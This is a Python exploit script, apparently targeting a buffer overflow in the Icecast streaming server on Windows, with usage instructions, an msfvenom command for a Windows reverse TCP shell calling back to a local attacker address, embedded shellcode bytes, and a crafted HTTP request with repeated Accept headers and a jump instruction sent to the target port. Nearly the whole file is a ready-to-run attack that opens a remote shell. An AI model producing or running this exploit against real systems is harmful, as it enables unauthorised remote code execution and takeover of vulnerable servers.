#!/usr/bin/env python3
##############################################################################################
# How to use:
# 1. Replace 'buf' shellcode below with msfvenom shellcode
# 2. Call it like this: ./icecast.py <target> <port>
# Eg. root@Kali:~# ./icecast.py 192.168.92.133 8000
##############################################################################################
import socket
import sys

host = sys.argv[1] # Receive IP from user
port = int(sys.argv[2]) # Receive Port from user

# Replace with own shellcode here
# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -f python -b '\x00\x0a\x0d'

buf =  b""
buf += b"\xdb\xc4\xbd\x1e\x9f\x71\x1c\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17\x83\xd9"
buf += b"\x9b\x93\xe9\x19\x4b\xd1\x12\xe1\x8c\xb6\x9b\x04"
buf += b"\xbd\xf6\xf8\x4d\xee\xc6\x8b\x03\x03\xac\xde\xb7"
buf += b"\x90\xc0\xf6\xb8\x11\x6e\x21\xf7\xa2\xc3\x11\x96"
buf += b"\x20\x1e\x46\x78\x18\xd1\x9b\x79\x5d\x0c\x51\x2b"
buf += b"\x36\x5a\xc4\xdb\x33\x16\xd5\x50\x0f\xb6\x5d\x85"
buf += b"\xd8\xb9\x4c\x18\x52\xe0\x4e\x9b\xb7\x98\xc6\x83"
buf += b"\xd4\xa5\x91\x38\x2e\x51\x20\xe8\x7e\x9a\x8f\xd5"
buf += b"\x4e\x69\xd1\x12\x68\x92\xa4\x6a\x8a\x2f\xbf\xa9"
buf += b"\xf0\xeb\x4a\x29\x52\x7f\xec\x95\x62\xac\x6b\x5e"
buf += b"\x68\x19\xff\x38\x6d\x9c\x2c\x33\x89\x15\xd3\x93"
buf += b"\x1b\x6d\xf0\x37\x47\x35\x99\x6e\x2d\x98\xa6\x70"
buf += b"\x8e\x45\x03\xfb\x23\x91\x3e\xa6\x2b\x56\x73\x58"
buf += b"\xac\xf0\x04\x2b\x9e\x5f\xbf\xa3\x92\x28\x19\x34"
buf += b"\xd4\x02\xdd\xaa\x2b\xad\x1e\xe3\xef\xf9\x4e\x9b"
buf += b"\xc6\x81\x04\x5b\xe6\x57\x8a\x0b\x48\x08\x6b\xfb"
buf += b"\x28\xf8\x03\x11\xa7\x27\x33\x1a\x6d\x40\xde\xe1"
buf += b"\xe6\x65\x1d\x81\x74\x11\x23\x51\x78\x59\xaa\xb7"
buf += b"\x10\x8d\xfb\x60\x8d\x34\xa6\xfa\x2c\xb8\x7c\x87"
buf += b"\x6f\x32\x73\x78\x21\xb3\xfe\x6a\xd6\x33\xb5\xd0"
buf += b"\x71\x4b\x63\x7c\x1d\xde\xe8\x7c\x68\xc3\xa6\x2b"
buf += b"\x3d\x35\xbf\xb9\xd3\x6c\x69\xdf\x29\xe8\x52\x5b"
buf += b"\xf6\xc9\x5d\x62\x7b\x75\x7a\x74\x45\x76\xc6\x20"
buf += b"\x19\x21\x90\x9e\xdf\x9b\x52\x48\xb6\x70\x3d\x1c"
buf += b"\x4f\xbb\xfe\x5a\x50\x96\x88\x82\xe1\x4f\xcd\xbd"
buf += b"\xce\x07\xd9\xc6\x32\xb8\x26\x1d\xf7\xc8\x6c\x3f"
buf += b"\x5e\x41\x29\xaa\xe2\x0c\xca\x01\x20\x29\x49\xa3"
buf += b"\xd9\xce\x51\xc6\xdc\x8b\xd5\x3b\xad\x84\xb3\x3b"
buf += b"\x02\xa4\x91"

evul = b"\xeb\x0c" + b" / HTTP/1.1 " + buf + b"\r\n" + b"Accept: text/html\r\n"*31
evul += b"\xff\x64\x24\x04" + b"\r\n\r\n"  # jmp [esp+4] 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
client.connect((host,port))                               #Connect to TCP socket
client.sendall(evul)  # Send buffer overflow
client.close()

print("\nDone!")

